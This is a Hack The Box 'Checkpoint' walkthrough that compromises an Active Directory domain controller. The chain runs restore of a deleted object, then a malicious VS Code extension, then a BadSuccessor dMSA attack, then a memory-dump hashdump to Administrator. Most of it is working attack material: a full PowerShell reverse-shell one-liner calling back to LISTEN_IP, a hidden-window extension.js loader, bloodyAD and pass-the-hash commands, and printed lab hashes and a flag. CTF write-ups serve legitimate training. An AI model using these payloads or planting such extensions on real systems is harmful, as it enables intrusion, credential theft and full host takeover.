---
IP: 10.129.173.65
title: Checkpoint - HTB Walkthrough
description:
date: 2026-10-25
draft: false
tags:
  - htb
  - active-directory
  - badsuccessor
  - tombstone
  - dmsa
  - ldap
  - vmware
  - kerberos
  - bloodyad
---
## Machine Summary:

The assumed breach scenario provides direct credentials for user `alex.turner` with password `Checkpoint2024!`. Initial enumeration will find the system is a Domain Controller running Windows Server 2025 with LDAP signing enforced. Utilizing NetExec's tombstone module, we will discover and restore the deleted AD object `mark.davies`, gaining write access to a monitored `DevDrop` share. We can then weaponize a Visual Studio Code extension (`.vsix`) with a PowerShell reverse shell, uploading it to the share to obtain a callback as `ryan.brooks`.

Reviewing BloodHound data, we will see the controlled user `ryan.brooks` has `GenericWrite` privileges over the service account `svc_deploy`. Because the domain is running Windows Server 2025, we can leverage Delegated Managed Service Accounts (dMSAs) to execute a BadSuccessor attack (CVE-2025-53779). Unlike traditional Kerberoasting which relies on requesting a service ticket and cracking the hash offline, or targeted Kerberos attacks involving `msDS-KeyCredentialLink` which write PKINIT keying material directly to the object, BadSuccessor targets the dMSA migration process. By creating a malicious dMSA and linking it as a successor to `svc_deploy`, we can request a Kerberos ticket that the KDC processes as an account migration. This forces the KDC to embed the target's PAC data into the ticket, allowing us to decrypt and extract the target's RC4 hash directly without requiring any password cracking.

With the extracted RC4 hash, we can authenticate as `svc_deploy` and access the `VMBackups` network share. Allowing the controlled user read access to download a 2GB virtual memory dump (`.vmem`). Utilizing Volatility 3, the SAM registry hive is decrypted directly from the memory dump, extracting the local `Administrator` NTLM hash and leading to complete host takeover via Evil-WinRM.
## Recon
### Nmap Scan Results
```bash
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-10-20 01:49:01Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49670/tcp open  msrpc             Microsoft Windows RPC
49671/tcp open  msrpc             Microsoft Windows RPC
49677/tcp open  msrpc             Microsoft Windows RPC
49678/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc             Microsoft Windows RPC
49708/tcp open  msrpc             Microsoft Windows RPC
49717/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-10-20T01:49:51
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
```

During initial enumeration we will find standard services indicating this is a Domain Controller. Script scanning did not show us much aside from a domain name and a large clock skew.

The scan reveals a clock skew of roughly 7 hours. Because Kerberos authentication fails if the time drift exceeds 5 minutes, we sync our attack host's system time before proceeding:
```bash
sudo timedatectl set-ntp false
sudo ntpdate -u 10.129.173.65
```

We update `/etc/hosts` with the domain name and hostname:
```bash
echo "10.129.173.65 checkpoint.htb DC01 DC01.checkpoint.htb" | sudo tee -a /etc/hosts
```
## Initial Access

The assumed breach scenario provides direct credentials for user `alex.turner` with password `Checkpoint2024!`.

We will find out that this DC is running Server 2025 which enforces LDAP signing by default. If you get `LDAP_STRONG_AUTH_REQUIRED` / `strongerAuthRequired`, local tools will need to be updated. `NetExec` and `bloodyAD` handle this well.

We can verify user access and shares with NetExec. We will find a readable share `DevDrop` with a hint in the description pointing to VS Code extensions compatible with engine 1.118.0.
```bash
nxc smb 10.129.173.65 -u alex.turner -p 'Checkpoint2024!' --shares
```

![](assets/fe8ab3836e653a0e5b8838cfa313cd58.png)

Checking the share with `smbclient` will find it empty.
```bash
smbclient -U 'checkpoint.htb\alex.turner%Checkpoint2024!' \\\\10.129.173.65\\DevDrop
```
```bash
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 16:45:01 2026
  ..                                  D        0  Sat May  9 09:42:27 2026

		10459391 blocks of size 4096. 2460475 blocks available
smb: \>
```

### Tombstone Object
One machine in particular, "TombWatcher," highlighted this attack vector. This incident left several individuals, including myself, quite frustrated.

Using NetExec's tombstone module we will find a deleted AD object `mark.davies`.
```bash
nxc ldap 10.129.173.65 -u alex.turner -p 'Checkpoint2024!' -M tombstone
```
![](assets/af0bb4a64926855d37f953d35074a600.png)

We can then restore the deleted object using the option `ACTION=restore` and supplying the discovered Object GUID.
```bash
nxc ldap 10.129.173.65 -u alex.turner -p 'Checkpoint2024!' -M tombstone -o ACTION=restore ID=2217e877-e2a2-47d7-91d4-99ede36f367e
```
![](assets/ec6ffae65bf3e68d52914c846d98088e.png)

We can test the known password `Checkpoint2024!` against `mark.davies` using `NetExec` and find we now have write access to `DevDrop`.
```bash
nxc smb 10.129.173.65 -u mark.davies -p 'Checkpoint2024!' --shares
```
![](assets/4f28312542a8b49c1f1ca452703c6b73.png)
### Shell as ryan.brooks
#### Crafting a VSIX Payload

MDSec goes into high level detail on this blog post:
- https://www.mdsec.co.uk/2023/08/leveraging-vscode-extensions-for-initial-access/

We can weaponize a malicious Visual Studio Extension package to execute arbitrary code, such as a reverse shell when our victim installs it. We will have to craft a custom extension with a reverse shell payload and upload it to the monitored SMB share.

A VSIX package (`.vsix`) is a compressed ZIP archive that follows the OPC standard. We first create the directory structure and the `[Content_Types].xml` file.
```bash
mkdir -p legit-ext/extension 
micro legit-ext/"[Content_Types].xml"
```
`[Content_Types].xml`:
```xml
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="json" ContentType="application/json"/>
  <Default Extension="js" ContentType="application/javascript"/>
</Types>
```

We then create the package configuration `extension/package.json`.
```json
{
  "name": "devtools-helper",
  "displayName": "DevTools Helper",
  "version": "1.0.0",
  "engines": {"vscode": "^1.118.0"},
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}
```

Encode a base64 PowerShell reverse shell payload.
```bash
echo '$client = New-Object System.Net.Sockets.TCPClient("LISTEN_IP","PORT");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 | tr -d '\n'; echo
```

Create `extension/extension.js` and paste our payload over `BASE64_PAYLOAD`.
```js
const cp = require('child_process');
const os = require('os');

exports.activate = function() {
    // PowerShell payload base64 encoded
    const payload = 'BASE64_PAYLOAD';
    
    cp.exec(`powershell -WindowStyle Hidden -NoProfile -e ${payload}`, 
            (error, stdout, stderr) => {
        if (error) console.error(error);
    });
};
exports.deactivate = function() {};
```

Lastly, we can package it into a `.vsix` archive file with `zip`.
```shell
cd legit-ext
zip -r devtools-helper.vsix '[Content_Types].xml' extension/
```

With our listener running, we can log into the `DevDrop` share with `smbclient` and deposit the package.
```shell
smbclient -U 'checkpoint.htb\mark.davies%Checkpoint2024!' '\\10.129.173.65\DevDrop'
```
```bash
smb: \> put devtools-helper.vsix
putting file devtools-helper.vsix as \devtools-helper.vsix (12.1 kB/s) (average 12.1 kB/s)
smb: \>
```

Checking back on our listener we can see we caught a shell as `ryan.brooks` and can grab the user flag.
```bash
$ rlwrap nc -lvnp 4545
Listening on 0.0.0.0 4545
Connection received on 10.129.173.65 59326

PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
```
## Privilege Escalation - BadSuccessor Attack

Reviewing BloodHound data we can see the controlled user `ryan.brooks` has `GenericWrite` over service account `svc_deploy`. Furthermore, we'll find `svc_deploy` is a member of `BackupAccess` and `Remote Management Users`.

![](assets/0aed3b014794abb04e6a6e65e9135ff5.png)

Without knowing `ryan.brooks`'s cleartext password, we cannot directly authenticate to LDAP or Kerberos from outside the box. Because we already have a session running as `ryan.brooks`, we can pull the users base64 encoded ticket via `Rubeus.exe`.
```bash
.\Rubeus.exe tgtdeleg /nowrap
```

Decode the base64 string from Rubeus output into a `.kirbi` file on our attack host. We can then convert it to `.ccache` using Impacket's `ticketConverter.py` and import it with `klist`.
```bash
# Decode
echo "<BASE64_TICKET>" | base64 -d > ticket.kirbi

# Convert with Impacket
ticketConverter.py --base64 ticket.kirbi ticket.ccache

# Export and check klist
export KRB5CCNAME=ticket.ccache
klist

Ticket cache: FILE:ticket.ccache
Default principal: ryan.brooks@CHECKPOINT.HTB

Valid starting       Expires              Service principal
10/20/2026 00:15:05  10/20/2026 10:15:05  krbtgt/CHECKPOINT.HTB@CHECKPOINT.HTB
	renew until 10/27/2026 00:15:05
```

We can execute the BadSuccessor attack using `bloodyAD`. Once the dMSA (`evil-dmsa$`) is created and linked as the successor, `bloodyAD` requests a Kerberos Service Ticket for `svc_deploy` using the dMSA's credentials. Because the KDC evaluates the dMSA as having migrated from `svc_deploy`, the Kerberos ticket issued by the KDC contains `svc_deploy`'s PAC data, retrieving service tickets that can be decrypted to extract keying material including RC4 and NTLM.
```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k add badSuccessor 'evil-dmsa' -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```

Going through the output we will discover the RC4 hash for `svc_deploy`: `e16081eb077aca74bdbf8af12af43ac9`.
```bash
[+] dMSA TGT stored in ccache file evil-dmsa_zt.ccache

dMSA current keys found in TGS:
AES256: 1d088155691579a6717168e23b8e5183f05135aea79bbfb5b204542a4e80c33d
AES128: a74d2fb76a46a4dce3457aa08e92682b
RC4: baa9968e5d1da7470c652ada5b8b76fc

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

### Access as svc_deploy

We can test the captured RC4 hash against the target machine using `NetExec` and find we now have read access to the `VMBackups` share.
```bash
$ nxc smb 10.129.180.42 -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares
```
![](assets/0662d3d9065305b1a449ad9fca21a9c5.png)

Connect to the share via `smbclient` using Pass-the-Hash and grab the 2GB virtual memory dump file `Windows Server 2019-Snapshot1.vmem`.
```bash
$ $ smbclient '//10.129.180.42/VMBackups' -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash
```
```bash
smb: \NightlyBackup_2024-11-01\memory forensics\> ls
  .                                   D        0  Sat May  9 12:12:44 2026
  ..                                  D        0  Sat May  9 11:54:19 2026
  Windows Server 2019-000001.vmdk      A 106496000  Sat May  9 21:45:22 2026
  Windows Server 2019-Snapshot1.vmem      A 2147483648  Sat May  9 21:40:36 2026
  Windows Server 2019-Snapshot1.vmsn      A 138164859  Sat May  9 21:40:36 2026
  Windows Server 2019.nvram           A   270840  Sat May  9 21:39:00 2026
  Windows Server 2019.scoreboard      A     7642  Sat May  9 21:45:22 2026
  Windows Server 2019.vmdk            A 10199695360  Sat May  9 21:39:00 2026
  Windows Server 2019.vmsd            A      502  Sat May  9 21:39:00 2026
  Windows Server 2019.vmx             A     2749  Sat May  9 21:45:22 2026
  Windows Server 2019.vmxf            A      274  Sat May  9 21:22:44 2026

		10459391 blocks of size 4096. 2481601 blocks available
smb: \NightlyBackup_2024-11-01\memory forensics\> get "Windows Server 2019-Snapshot1.vmem"                    
getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem of size 2147483648 as Windows Server 2019-Snapshot1.vmem (5086.2 KiloBytes/sec) (average 5086.2 KiloBytes/sec)
```

### Shell as Administrator

We can use the Volatility 3 framework to decrypt the SAM registry stored in the memory backup and extract the local NTLM hashes with the `windows.hashdump` plugin.
```bash
$ vol -f Windows\ Server\ 2019-Snapshot1.vmem windows.hashdump
```

Reviewing the output we will discover a `NTLM` hash for the local `Administrator` account: `f29e9c014295b9b32139b09a2790be3b`.
```bash
User	rid	lmhash	nthash

Administrator	500	aad3b435b51404eeaad3b435b51404ee	f29e9c014295b9b32139b09a2790be3b
Guest	501	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount	503	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtilityAccount	504	aad3b435b51404eeaad3b435b51404ee	28f8d934dee90b2ec824351cb0844479
```

With `Administrator` access we can log in via `Evil-WinRM`, extract the contents of `root.txt` from `max.palmer`'s desktop.
```bash
$ evil-winrm-py -i 10.129.180.42 -u Administrator -H 'f29e9c014295b9b32139b09a2790be3b'
```
```powershel
evil-winrm-py PS C:\users\max.palmer\desktop> cat root.txt
5ed92760ba1f6e5295bd2eb4f1b177f2
```